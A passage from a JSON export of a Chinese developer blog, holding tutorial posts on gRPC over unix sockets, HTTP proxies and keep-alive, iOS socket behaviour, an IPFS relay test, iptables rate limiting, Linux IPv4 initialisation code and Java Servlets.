\u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; ) type server struct { pb.UnimplementedGreeterServer } // 实现 SimpleRPC 方法 func (s *server) SimpleRPC(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) { log.Println(\u0026#34;client call simpleRPC...\u0026#34;) log.Println(in) return \u0026amp;pb.HelloResponse{Reply: \u0026#34;Hello \u0026#34; + in.Name}, nil } // 移除存在的 unix socket 文件 func removeExistedSock(file string) { stat, err := os.Stat(file) if err == nil { if stat.Mode().Type() == os.ModeSocket { err := os.Remove(file) if err != nil { log.Fatal(err) } } } } func main() { removeExistedSock(\u0026#34;/tmp/default.sock\u0026#34;) // 解析 unix socket 地址 addr, err := net.ResolveUnixAddr(\u0026#34;unix\u0026#34;, \u0026#34;/tmp/default.sock\u0026#34;) if err != nil { log.Fatal(err) return } // 监听 unix socket 文件 unix, err := net.ListenUnix(\u0026#34;unix\u0026#34;, addr) if err != nil { log.Fatal(err) return } s := grpc.NewServer() // 绑定 unix socket 连接 pb.RegisterGreeterServer(s, \u0026amp;server{}) log.Println(\u0026#34;gRPC server starts running...\u0026#34;) // 启动服务 err = s.Serve(unix) if err != nil { log.Fatal(err) return } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package main import ( \u0026#34;context\u0026#34; \u0026#34;grpcDemo/pb\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; \u0026#34;google.golang.org/grpc/credentials/insecure\u0026#34; ) func simpleRPC(c pb.GreeterClient) { ctx := context.Background() reply, err := c.SimpleRPC(ctx, \u0026amp;pb.HelloRequest{Name: \u0026#34;simpleRPC\u0026#34;}) if err != nil { log.Fatal(err) } log.Println(reply.GetReply()) } // 被 gRPC 框架调用，创建 unix socket 连接 func UnixConnect(ctx context.Context, addrs string) (net.Conn, error) { addr, err := net.ResolveUnixAddr(\u0026#34;unix\u0026#34;, addrs) if err != nil { return nil, err } conn, err := net.DialUnix(\u0026#34;unix\u0026#34;, nil, addr) if err != nil { return nil, err } return conn, nil } func main() { // 创建 gRPC 连接客户端 conn, err := grpc.Dial(\u0026#34;/tmp/default.sock\u0026#34;, grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithContextDialer(UnixConnect)) if err != nil { log.Fatal(err) return } // 创建当前 protobuff 的客户端对象 client := pb.NewGreeterClient(conn) simpleRPC(client) } 分别使用两个终端运行服务端和客户端的代码:\n1 2 3 4 5 6 7 \u0026gt; go run server1/server.go 2022/10/27 09:59:16 gRPC server starts running... 2022/10/27 10:01:47 client call simpleRPC... 2022/10/27 10:01:47 name:\u0026#34;simpleRPC\u0026#34; \u0026gt; go run client1/client.go 2022/10/27 10:01:47 Hello simpleRPC ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/grpc-%E5%85%A5%E9%97%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","title":"gRPC 入门使用教程"},{"content":"gRPC 提供接口文档 在 RESULTful 接口服务中，我们可以使用 swagger 来展示当前服务接口列表，但是当我们的项目是使用的 gRPC 提供接口服务时，就没法使用 swagger 来做接口展示服务了。\n为了解决这个问题，本文将介绍 protoc-gen-doc 加 静态文件 Web 服务 的方式来在线提供 gRPC 文档。\n一、编写 gRPC 服务 在开始生成接口文档之前，我们先简单定义一个 gRPC 服务：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // pb/hello.proto syntax = \u0026#34;proto3\u0026#34;; option go_package = \u0026#34;./;pb\u0026#34;; package pb; service Greeter { // simple RPC rpc SimpleRPC(HelloRequest) returns (HelloResponse); // Bidirectional Streaming RPC rpc BidrectionalStreamingRPC(stream HelloRequest) returns (stream HelloResponse); // Repeated Test RPC rpc RepeatedTest(HelloRequest) returns (RepeatedResponse); // Map Test RPC rpc MapTest(HelloRequest) returns (MapResponse); } message HelloRequest {string name = 1;} message HelloResponse {string reply = 1;} message RepeatedResponse { message Result { string name = 1; int32 age = 2; } repeated Result results = 1; } message MapResponse { map\u0026lt;string,int64\u0026gt; dict = 1; } 生成 gRPC 接口文档 首先需要安装 protoc-gen-doc 插件(默认已经安好 protoc 和 Go):\n1 go install github.com/pseudomuto/protoc-gen-doc/cmd/protoc-gen-doc@latest 安装完成后生成文档（需要手动创建 doc 文件夹 ）：\n1 protoc --doc_out=./doc --doc_opt=html,index.html pb/*.proto 命令执行成功后，会在 doc 文件夹下面生成 index.html 文件。如果想要生成其他格式的文档，可以参看官方文档：pseudomuto/protoc-gen-doc: Documentation generator plugin for Google Protocol Buffers (github.com)\n浏览器打开 index.html 文件：\n三、启动静态文件 Web 服务 由于 gRPC 是使用的 HTTP 2.0 协议，但是想要在网页端访问文件又需要 HTTP 1.1 协议，因此需要让当前服务能够根据 HTTP 协议版本分别提供 gRPC 服务和静态文件 Web 服务。\n为了达成当前效果，我们需要借助一个 cmux 库，\ncmux是一个通用的Go库，用于根据负载对连接进行多路复用。使用cmux，可以在同一个TCP侦听器上提供gRPC、SSH、HTTPS、HTTP、Go-RPC和几乎任何其他协议。\n下载该库：\n1 go get -u github.com/soheilhy/cmux 编写服务端代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 func RunGrpcServer() *grpc.Server { s := grpc.NewServer() pb.RegisterGreeterServer(s, \u0026amp;server{}) reflection.Register(s) return s } func RunHttpServer() *http.Server { serveMux := http.NewServeMux() // 处理静态资源 serveMux.Handle(\u0026#34;/doc/\u0026#34;, http.FileServer(http.Dir(\u0026#34;.\u0026#34;))) return \u0026amp;http.Server{ Addr: \u0026#34;:5678\u0026#34;, Handler: serveMux, } } func main() { l, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:5678\u0026#34;) if err != nil { log.Fatalf(\u0026#34;Run TCP Server err: %v\u0026#34;, err) } // 创建一个多路复用器 m := cmux.New(l) // 匹配 gRPC 应用 grpcL := m.MatchWithWriters(cmux.HTTP2MatchHeaderFieldPrefixSendSettings(\u0026#34;content-type\u0026#34;, \u0026#34;application/grpc\u0026#34;)) // 匹配 HTTP 1.1 应用 httpL := m.Match(cmux.HTTP1Fast()) // 处理 gRPC 服务 grpcS := RunGrpcServer() // 处理 HTTP 服务 httpS := RunHttpServer() go grpcS.Serve(grpcL) go httpS.Serve(httpL) err = m.Serve() if err != nil { log.Fatalf(\u0026#34;Run Serve err: %v\u0026#34;, err) } } 运行服务，打开浏览器访问 Protocol Documentation，即可访问到我们之前生成的 gRPC 文档。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/grpc-%E6%8F%90%E4%BE%9B%E6%8F%90%E4%BE%9B%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3/","title":"gRPC 提供提供接口文档"},{"content":"HTTP 代理 HTTP 代理存在两种形式：\n第一种是 RFC 7230 - HTTP/1.1: Message Syntax and Routing描述的普通代理。这种代理扮演的是 “中间人” 角色，对于连接到它的客户端来说，它是服务端；对于要连接的目标服务器来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文，在传送的过程中需要对 HTTP 数据包进行修改； 第二种是 Tunneling TCP based protocols through Web proxy servers描述的隧道代理。它通过使用 HTTP 的 CONNECT 方法建立连接，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。 普通代理 普通代理实际上就是一个中间人，同时扮演者客户端和服务端的角色。普通代理会关心 HTTP 数据包，对于每一个 HTTP 数据包都需要修改之后再发送到服务端。\n下图（出自《HTTP 权威指南》）展示了这种行为：\n对于普通 HTTP 代理，是无法代理 HTTPS 流量的。因为 HTTP 代理本身是一个 HTTP 服务器，没法提供 HTTPS 服务。即使我们将 HTTP 代理直接变成一个 HTTPS 服务器，同样也无法抓取 HTTPS 包。因为 HTTPS 是能够防止中间人攻击的。\n普通代理如果想要实现代理 HTTPS 包，必须要在客户端安装根证书，用于窃取 TLS 交换过程中的双端密钥。这个过程就类似于 Fiddler、Charles等 HTTPS 抓包工具的原理。\n隧道代理 隧道代理在某种程度上来说和 HTTP 关系不大，它只是借用了 HTTP 的 CONNECT 方法建立连接。隧道代理实际上和 SOCK 代理更为相似。\n下图（出自《HTTP 权威指南》）展示隧道代理的原理：\n隧道代理无论是 HTTP 的流量还是 HTTPS 的流量，都能够进行代理。不仅是 HTTP 和 HTTPS，只要是 TCP 或者是 UDP 协议的流量，他都能够代理。\n隧道代理只会无脑转发流量，而不会查看流量，就像一根管子，将两端连接在一起。这也是为什么叫隧道代理的原因。\n参考：\n《HTTP 权威指南》 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/http-%E4%BB%A3%E7%90%86/","title":"HTTP 代理"},{"content":"HTTP 长连接 HTTP 短连接 请求 HTTP 时，发送一个HTTP请求就打开一个 TCP 连接，收到响应后就关闭 TCP 连接。\n这种方式就被称为 HTTP 短连接。\nHTTP 长连接 HTTP 短连接会在每次请求时都新建一个 TCP 连接，这种重复建立 TCP 连接会耗费大量资源。\n如果后续的 HTTP 请求能够复用第一次 HTTP 请求时建立的 TCP 连接，那么就不用浪费大量的资源在 TCP 的建立和销毁上。\nHTTP 长连接技术就实现了这种优化策略。\nHTTP 请求头中，有一个 Connection 字段，如果要开启长连接，那么就设置 Connection: Keep-Alive。如果服务器支持 HTTP 长连接，那么也会在响应头中设置Connection: Keep-Alive；如果服务器不支持长连接，那么则会响应Connection: close。\n如果服务器支持长连接，那么客户端会复用 TCP 连接，将后续的 HTTP 请求也用同一个 TCP 连接进行发送。\nKeep-Alive 这个功能在 HTTP 1.0 中默认是关闭的；在 HTTP 1.1 开始则是默认开启的。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/http-%E9%95%BF%E8%BF%9E%E6%8E%A5/","title":"HTTP 长连接"},{"content":"Welcome to Lynx\u0026rsquo;s Blog 留的一些坑：\niptables 三表五链 sync.WaitGroup BIRD 路由协议软件(参考：url) gViso 了解，协议栈实现 NaCI 加密算法(参考：url) Noise 加密算法了解(参考：url) Disco 加密算法了解(参考：url) WebSocket 链接连接流程分析 UDP 流量伪装为 TCP KCP 协议 bufio 包使用 netlink套接字 kcptun 项目 quic 协议 http3 chacha20算法 windows namedpipe windows SDDL Syntax webrtc 了解 webtransport 了解 死锁、活锁、饥饿、自旋锁 半虚拟化网卡 Forward Error Correction 算法 重放攻击 TCP重置报文段(RST) Go 调用动态链接库 pcap 库学习 Go 条件编译 linux socket的 sendmmsg 和 recvmmsg 一致性哈希算法 MPC 安全多方计算 MPTCP 学习 url Groupcache 学习 BT Sync（Resilio Sync）自动同步 vpn gate使用 Go 使用不同编码 lock-free 编程 CAS 机制 hmac 了解 double-defer 机制 UEFI 和 BIOS 地址复用和端口复用 Go 泛型 TCP 状态机 Linux 常见虚拟网卡 libp2p 事件总线设计 ASN 自治系统 拓展原语和并发原语 errorgroups 学习 函数选项模式 go.uber.org/fx 依赖注入\\ windows iphlpapi.dll ioctl go mod 原理 github.com/ulule/deepcopier webkit //go:linkname 、//go:nosplit 等Go编译器指令 runtime.procyield gob fsnotify sync.Cond sqlite wal模式 文件读写锁 geohash geojson 使用 GraphQL Temporal actor 模型 扇入和扇出 linux attribute epoll 机制原理 限流机制：计数器、滑动窗口、漏桶、令牌桶 unix socket抓包 Server Send Event 聚类算法 Happy Eyeballs 机制 过滤器：BitMap、布隆过滤器 分布式数据协议 - DDP 竞态检测：src\\internal\\race.Enabled twamp io_uring liburing webhook false sharing: What’s false sharing and how to solve it (using Golang as example) 证书链 凤凰架构 go http 超时 go 单元测试 https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html rust、erlang、go进程模型分析 Wake-on-LAN XDP 技术 无root下进行ping go unix socket 编程 CoAP 协议 SOCK_SEQPACKET 共享内存 VNC Guacamole Protocol ALPN ECN DMZ errgroup iperf3 粘包问题处理框架 安卓基于VPN抓包框架 HTTPS 原理 签名与加密 STUN server 实现 MDNS 原理 跨进程通信方案 Windows 虚拟网卡创建 惊群 Reactor 和 Proactor webrtc得gcc 和pcc 华为fillp tcp Brutal dns fallback机制 jni 原理 网站更新订阅 双缓冲和Exchanger 端口映射客户端（NAP-PMP/PCP/UPnP） p2p 工具箱 Windows 电脑双网卡设置优先级 terraform dns 解析 tls 流程 DPLPMTUD SCTP Gossip ALPNs HTTP 100 Continue service worker arc 缓存 ipv6 zone id 未 listen 的 TCP socket能否接收新的连接 TCPdive go 重写 https://github.com/fastos/tcpdive mdns服务 udplite listen link-local IP 需要携带 zone index go tag使用 tracert 原理 qpp https://github.com/xtaci/qpp https://link.springer.com/content/pdf/10.1140/epjqt/s40507-023-00164-3.pdf delve 原理 wireshark noise 插件开发 TLS 校验流程（时间不同步引发的校验失败问题） tc 命令常用用法 Linux Advanced Routing \u0026amp; Traffic Control HOWTO iptables hashlimit ecaptures keylog Go 1.23 unique、 package ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/index/","title":"index"},{"content":"iOS 后台时对 socket 的处理 在 iOS 平台种，当程序进入后台后会对 TCP/UDP 套接字做处理，这种处理会影响我们在 iOS 端的网络开发，因此需要对其进行了解。\n相关技术文档：https://developer.apple.com/library/archive/technotes/tn2277/_index.html#//apple_ref/doc/uid/DTS40010841-RevisionHistory-DontLinkElementID_1\n基础知识 iOS 将 socket 根据使用划分为 listening sockets 和 data sockets：\nlistening sockets：处于 listen 状态的 TCP socket； data sockets：connect 状态的 TCP socket，UDP socket。 listening sockets 对于处于 listen 状态的 TCP 套接字，在应用进入后台后，socket 会被内核挂起，处于一个特殊的\u0026quot;暂停状态\u0026quot;。\n在\u0026quot;暂停状态\u0026quot;下，内核仍会认为 socket 处于 active 状态。如果有 client 试图连接到该 socket，内核会接收连接，但是该 socket 无法收到连接。在等待一段时间后客户端会放弃连接，返回 \u0026ldquo;connection refused\u0026rdquo; 错误信息。\ndata sockets 对于 data socket，当 APP 被系统挂起（suspended）时，内核可能会回收该 socket 资源，回收之后所有在该 socket 上的操作都会失效，应用会收到来自内核的 \u0026ldquo;recvmsg: socket is not connected\u0026rdquo; 错误信息。\n总结 因此对于所有类型 socket，最好的处理方式都是在应用进入后台后最好主动关闭它；恢复前台时再重新打开它。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ios-%E5%90%8E%E5%8F%B0%E6%97%B6%E5%AF%B9-socket-%E7%9A%84%E5%A4%84%E7%90%86/","title":"iOS 后台时对 socket 的处理"},{"content":"IPFS 网络测试 说明 本测试是为了测试 IPFS DHT 网络在国内使用时的网络情况。\n由于测试环境限制，本测试中手机端网络所处地理位置均在成都。\n测试流程 设备端：\n通过 libp2p 提供的默认 IPFS DHT bootstrap 节点连接到 IPFS 网络； 在网络中通过 DHT 的查询临近节点的功能搜索网络中节点，并从中筛选出可用作 Relay 的节点，与其建立连接； 将自身节点信息广播到 IPFS DHT 网络。 手机端：\n设备端通过 libp2p 提供的默认 IPFS DHT bootstrap 节点连接到 IPFS 网络； 通过 IPFS DHT 网络查询设备端节点信息； 尝试与设备端建立连接； 尝试利用 Relay 进行打洞； 测试结果 设备端:\n网络环境 \\ 操作 连接到 bootstrap 节点耗时 中继节点筛选耗时 中继****延迟 移动宽带 1s 10s 150ms~300ms 电信宽带 1s 8s 150ms~300ms 阿里云 1s 11s 150ms~300ms 手机端:\n运营商 \\ 操作 连接到 bootstrap 节点耗时 查询到服务端节点信息耗时 连接到对端节点耗时 联通 1s 31s 3s 电信 1s 29s 2s 移动 1s 30s 3s 分析 DHT 节点和 Relay 节点来源？ 查看日志发现，连接的 DHT 节点和找到的中继节点大部分（实测 90% 以上）都是国外的 IP 地址。\n下图是随机选择的几个节点地址进行地理位置查询： 中继节点筛选和查询到服务端节点信息耗时为什么较长？ 主要有两个原因造成：\n当 libp2p 连接到 IPFS 网络时，DHT 模块在启动后，会先执行查询临近节点 DHT 节点池的操作。默认 DHT 节点池子大小为 200 （每个桶 20 个节点，10个桶）个节点，该过程会消耗较长时间； 当执行查询操作时，会向临近节点发送查询请求。但是由于整个 DHT 网络较为庞大，很难通过一次查询就正好查找到包含设备端节点信息的节点。因此需要多次查询才能查询到对端信息。 由于设备端只需要执行操作 1，而手机端需要执行操作 1 和 2。因此设备端耗时相比于手机端会短一些。\n中继节点查询为什么这么快？ 在默认情况下，libp2p 会根据自身检测到的网络可见性情况而选择是否提供中继服务和 DHT 查询服务。\n默认情况下，当 libp2p 发现节点处于公网可见状态时，会同时开启 DHT 查询服务和 Relay 服务。因此查询到的大部分 DHT 节点（实测在 80% 以上）都可以作为中继服务。\n不过在默认情况下，libp2p 启动 Relay 服务时，会存在资源限制。因此 Relay 节点只能用于传输少量数据。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ipfs-%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95/","title":"IPFS 网络测试"},{"content":" 1 2 3 4 # 连接带宽限制 iptables -A OUTPUT -o eth0 -m hashlimit --hashlimit-above 3000kb/s --hashlimit-mode dstip,dstport --hashlimit-name out -j DROP iptables -A INPUT -i eth0 -m hashlimit --hashlimit-above 3000kb/s --hashlimit-mode srcip,srcport --hashlimit-name in -j DROP ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/iptables-%E5%AF%B9%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E9%99%90%E9%80%9F/","title":"iptables 对所有连接限速"},{"content":"iptables 三表五链 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/iptables-%E4%B8%89%E8%A1%A8%E4%BA%94%E9%93%BE/","title":"iptables 三表五链"},{"content":"ipv4 - init 入口 1 2 3 // net/ipv4/af_inet.c fs_initcall(inet_init); fs_initcall 是一个宏，用于将函数指针放到指定的内存区域，便于内核初始化时运行函数。这里简单理解为将 inet_init 函数注册到 Linux 内核初始化流程中即可。\ninet_init inet_init 函数用于初始化整个 IPv4 协议栈。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 // net/ipv4/af_net.c static int __init inet_init(void) { struct inet_protosw *q; struct list_head *r; int rc; // 检查 inet_skb_parm 大小是否与 sk_buff 控制块的大小匹配 sock_skb_cb_check_size(sizeof(struct inet_skb_parm)); // 协议注册，将其挂载到/proc文件系统上。通过/proc/net/protocols可以看到注册协议的统计信息 rc = proto_register(\u0026amp;tcp_prot, 1); if (rc) goto out; rc = proto_register(\u0026amp;udp_prot, 1); if (rc) goto out_unregister_tcp_proto; rc = proto_register(\u0026amp;raw_prot, 1); if (rc) goto out_unregister_udp_proto; rc = proto_register(\u0026amp;ping_prot, 1); if (rc) goto out_unregister_raw_proto; /* *\tTell SOCKET that we are alive... */ // 注册socket family, 当使用 socket(2) 中指定 family 时就能通过 inet_family_ops 中的inet_create 创建 ipv4 socket (void)sock_register(\u0026amp;inet_family_ops); #ifdef CONFIG_SYSCTL ip_static_sysctl_init(); #endif /* *\tAdd all the base protocols. */ // 注册传输层协议处理函数 if (inet_add_protocol(\u0026amp;icmp_protocol, IPPROTO_ICMP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add ICMP protocol\\n\u0026#34;, __func__); if (inet_add_protocol(\u0026amp;udp_protocol, IPPROTO_UDP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add UDP protocol\\n\u0026#34;, __func__); if (inet_add_protocol(\u0026amp;tcp_protocol, IPPROTO_TCP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add TCP protocol\\n\u0026#34;, __func__); #ifdef CONFIG_IP_MULTICAST if (inet_add_protocol(\u0026amp;igmp_protocol, IPPROTO_IGMP) \u0026lt; 0) pr_crit(\u0026#34;%s: Cannot add IGMP protocol\\n\u0026#34;, __func__); #endif /* Register the socket-side information for inet_create. */ for (r = \u0026amp;inetsw[0]; r \u0026lt; \u0026amp;inetsw[SOCK_MAX]; ++r) INIT_LIST_HEAD(r); for (q = inetsw_array; q \u0026lt; \u0026amp;inetsw_array[INETSW_ARRAY_LEN]; ++q) inet_register_protosw(q); /* *\tSet the ARP module up */ arp_init(); /* *\tSet the IP module up */ ip_init(); /* Setup TCP slab cache for open requests. */ tcp_init(); /* Setup UDP memory threshold */ udp_init(); /* Add UDP-Lite (RFC 3828) */ udplite4_register(); raw_init(); ping_init(); /* *\tSet the ICMP layer up */ if (icmp_init() \u0026lt; 0) panic(\u0026#34;Failed to create the ICMP control socket.\\n\u0026#34;); /* *\tInitialise the multicast router */ #if defined(CONFIG_IP_MROUTE) if (ip_mr_init()) pr_crit(\u0026#34;%s: Cannot init ipv4 mroute\\n\u0026#34;, __func__); #endif if (init_inet_pernet_ops()) pr_crit(\u0026#34;%s: Cannot init ipv4 inet pernet ops\\n\u0026#34;, __func__); /* *\tInitialise per-cpu ipv4 mibs */ if (init_ipv4_mibs()) pr_crit(\u0026#34;%s: Cannot init ipv4 mibs\\n\u0026#34;, __func__); ipv4_proc_init(); ipfrag_init(); dev_add_pack(\u0026amp;ip_packet_type); ip_tunnel_core_init(); rc = 0; out: return rc; out_unregister_raw_proto: proto_unregister(\u0026amp;raw_prot); out_unregister_udp_proto: proto_unregister(\u0026amp;udp_prot); out_unregister_tcp_proto: proto_unregister(\u0026amp;tcp_prot); goto out; } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/ipv4-init/","title":"ipv4 - init"},{"content":"Java Web学习：HttpServlet 一、简介 HttpServlet是GenericServlet的子类，又是在GenericServlet的基础上做了增强；\n一般在实际开发中，都是通过继承 HttpServlet 类的方式去实现 Servlet 程序；\n在 HttpServlet 类中分别提供 doDelete()，doGet()，doOptions()，doPost(),，doPut() 和 doTrace() 这些方法来对对应的 HTTP 方法进行服务；\nHttpServlet 类的 doXxx 方法则会抛出一个异常会默认返回 405 异常，因此对相应的方法进行重写时不需要实现父类的方法。\n二、编写 Servlet 程序 新建文件 HelloServlet.java 文件，添加代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.example.servelet; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; public class HelloServlet2 extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\u0026#34;GET 方式\u0026#34;); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { System.out.println(\u0026#34;POST 方式\u0026#34;); } } 配置 web.xml 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;!--给 Servlet 程序起别名(一般是类名)--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet2\u0026lt;/servlet-name\u0026gt; \u0026lt;!--Servlet 程序的全类名--\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.servelet.HelloServlet2\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;!--给 Servlet 程序配置访问地址--\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;!-- 告诉 Tomcat 当前配置地址给哪个 Servlet 程序使用--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet2\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 配置的访问地址 --\u0026gt; \u0026lt;url-pattern\u0026gt;/hello2\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 打开浏览器，分别使用 GET 方法和 POST 方法访问 http://127.0.0.1:8080/hello2，可以发现 doGet() 方法和 doPost() 方法分别被调用。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java-web%E5%AD%A6%E4%B9%A0httpservlet-%E7%B1%BB/","title":"Java Web学习：HttpServlet 类"},{"content":"Java Web学习——Servlet 入门 一、Servlet 简介 Servlet 是 JavaEE 规范之一，同时它也是 JavaWeb三大组件（Servlet 程序、Filter 过滤器、Listener 监听器）之一。\nServlet 是在服务器上运行的小程序，它是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。。其主要功能在于交互式地浏览和修改数据，生成动态Web内容。\n二、创建 Servlet 程序 配置好 Servlet 项目依赖后，按照下图所示创建文件夹和文件如下： HelloServlet.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package com.example.servelet; import javax.servlet.*; import java.io.IOException; public class HelloServlet implements Servlet { @Override public void init(ServletConfig servletConfig) throws ServletException { } @Override public ServletConfig getServletConfig() { return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.out.println(\u0026#34;Servlet 被访问\u0026#34;); } @Override public String getServletInfo() { return null; } @Override public void destroy() { } } web.xml：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;!--给 Tomcat 配置 Servlet 程序--\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;!--给 Servlet 程序起别名(一般是类名)--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!--Servlet 程序的全类名--\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.servelet.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;!--给 Servlet 程序配置访问地址--\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;!-- 告诉 Tomcat 当前配置地址给哪个 Servlet 程序使用--\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;!-- 配置的访问地址 --\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; index.jsp：\n\u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;$Title$\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; $END$ \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 运行程序，浏览器访问地址：http://127.0.0.1:8080，网页出现如下信息：\n浏览器访问地址：http://127.0.0.1:8080/hello，控制台打印出：Servlet 被访问。\n至此第一个 Servlet 程序就已经运行成功了！\n三、Servlet 生命周期 与 Servlet 生命周期有关的方法一般有以下三个：\n1、init()： init() 方法是在创建 Servlet 对象时被调用，而且只能被调用一次，用于 Servlet 对象在整个生命周期内的唯一一次初始化。只有在 init() 方法调用成功后，Servlet 才会处于服务状态，才能够去处理客户端的请求； 2、service()： service() 方法是 Servlet 工作的核心方法。当客户端请求访问 Servlet 时，Servlet 容器就会调用 service() 方法去处理来自客户端的请求，并把处理后的响应返回给客户端； 3、destroy()： destory() 方法是 Servlet 容器回收 Servlet 对象之前调用的，且只会调用一次，而此时的服务器处于停止状态或者访问资源已经被移除。 四、Servlet 请求分发 当我们使用不同的方式去请求 Servlet 的同一个地址时，例如使用 POST 和 GET 方法去请求同一个路由地址，我们希望在使用 GET 方法时 Servlet 程序返回页面信息，使用 POST 方法向 Servlet 程序提交数据。\n要实现这种效果，我们可以通过判断客户端请求的方法来进行不同的处理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { // 类型转换 HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest; // 获取请求方式 String method = httpServletRequest.getMethod(); // 判断请求方式 if 